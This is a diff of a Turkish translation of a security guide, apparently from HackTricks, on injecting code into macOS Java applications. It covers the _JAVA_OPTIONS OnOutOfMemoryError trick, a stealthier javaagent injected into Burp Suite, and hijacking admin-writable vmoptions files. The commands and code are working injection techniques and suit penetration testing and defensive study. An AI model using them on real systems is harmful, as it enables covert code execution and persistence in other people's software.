@@ -1,10 +1,10 @@
-# macOS Java Uygulamaları Enjeksiyonu
+# macOS Java Applications Injection
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Sayım
+## Enumerasyon
 
-Sisteminizde yüklü Java uygulamalarını bulun. **Info.plist** içindeki Java uygulamalarının **`java.`** dizesini içeren bazı java parametreleri barındırdığı gözlemlenmiştir, bu nedenle bunun için arama yapabilirsiniz:
+Sisteminizde yüklü Java uygulamalarını bulun. **Info.plist** içindeki Java uygulamalarının, **`java.`** dizesini içeren bazı Java parametrelerine sahip olduğu fark edilmiştir; bu nedenle şu şekilde arama yapabilirsiniz:
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,13 +14,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-Env değişkeni **`_JAVA_OPTIONS`** bir java derlenmiş uygulamasının yürütülmesinde keyfi java parametrelerini enjekte etmek için kullanılabilir:
+**`_JAVA_OPTIONS`** env variable'ı, Java ile derlenmiş bir app'in çalıştırılması sırasında arbitrary Java parametreleri enjekte etmek için kullanılabilir:
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-Bunu yeni bir işlem olarak ve mevcut terminalin bir çocuğu olarak değil, çalıştırmak için şunu kullanabilirsiniz:
+Bunu mevcut terminalin child process'i olarak değil, yeni bir process olarak çalıştırmak için şunu kullanabilirsiniz:
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-Ancak, bu çalıştırılan uygulamada bir hata tetikleyecektir, daha gizli bir yol ise bir java ajanı oluşturmak ve şunu kullanmaktır:
+Ancak bu, çalıştırılan uygulamada bir hatayı tetikler; daha gizli bir yöntem, bir java agent oluşturup şunu kullanmaktır:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,9 +83,9 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> Uygulamadan **farklı bir Java sürümü** ile ajan oluşturmak, hem ajanın hem de uygulamanın çalışmasını çökertilebilir.
+> Agent'i uygulamadan **farklı bir Java version** ile oluşturmak, hem agent'in hem de uygulamanın çalışmasının crash olmasına neden olabilir.
 
-Ajanın nerede olabileceği:
+Agent şu konumlarda olabilir:
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -102,7 +102,7 @@ err.printStackTrace();
 }
 }
 ```
-Ajanı derlemek için şunu çalıştırın:
+Agent'ı derlemek için çalıştırın:
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
@@ -114,7 +114,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-Ve ardından env değişkenini dışa aktarın ve java uygulamasını şu şekilde çalıştırın:
+Ardından ortam değişkenini export edin ve Java uygulamasını şu şekilde çalıştırın:
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -123,14 +123,14 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-## vmoptions dosyası
+## vmoptions file
 
-Bu dosya, Java çalıştırıldığında **Java parametrelerinin** belirtilmesini destekler. Java parametrelerini değiştirmek ve **sürecin rastgele komutlar çalıştırmasını sağlamak** için önceki hilelerden bazılarını kullanabilirsiniz.\
-Ayrıca, bu dosya `include` dizini ile **başka dosyaları da içerebilir**, böylece dahil edilen bir dosyayı da değiştirebilirsiniz.
+Bu file, Java çalıştırıldığında **Java params** belirtilmesini destekler. Önceki bazı trick'leri kullanarak Java params'lerini değiştirebilir ve **process'in arbitrary commands çalıştırmasını sağlayabilirsiniz**.\
+Ayrıca bu file, `include` directory'si ile **başka file'ları da include edebilir**; dolayısıyla include edilen bir file'ı da değiştirebilirsiniz.
 
-Dahası, bazı Java uygulamaları **birden fazla `vmoptions`** dosyasını **yükleyecektir**.
+Dahası, bazı Java apps **birden fazla `vmoptions`** file'ı **load eder**.
 
-Android Studio gibi bazı uygulamalar, bu dosyaları nerede aradıklarını **çıktılarında belirtir**, örneğin:
+Android Studio gibi bazı applications, bu file'ları **nerede aradıklarını output'larında belirtir**, örneğin:
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +141,7 @@ Android Studio gibi bazı uygulamalar, bu dosyaları nerede aradıklarını **ç
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-Eğer yapmazlarsa, bunu kolayca kontrol edebilirsiniz:
+Yapmıyorlarsa bunu şu komutla kolayca kontrol edebilirsiniz:
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -149,6 +149,6 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-Android Studio'nun bu örnekte **`/Applications/Android Studio.app.vmoptions`** dosyasını yüklemeye çalışmasının ne kadar ilginç olduğunu not edin; bu, **`admin` grubundaki** herhangi bir kullanıcının yazma erişimine sahip olduğu bir yerdir. 
+Bu örnekte Android Studio'nun **`/Applications/Android Studio.app.vmoptions`** dosyasını yüklemeye çalışması oldukça ilginçtir; burası **`admin` grubundaki herhangi bir kullanıcının yazma erişimine sahip olduğu** bir konumdur.
 
 {{#include ../../../banners/hacktricks-training.md}}
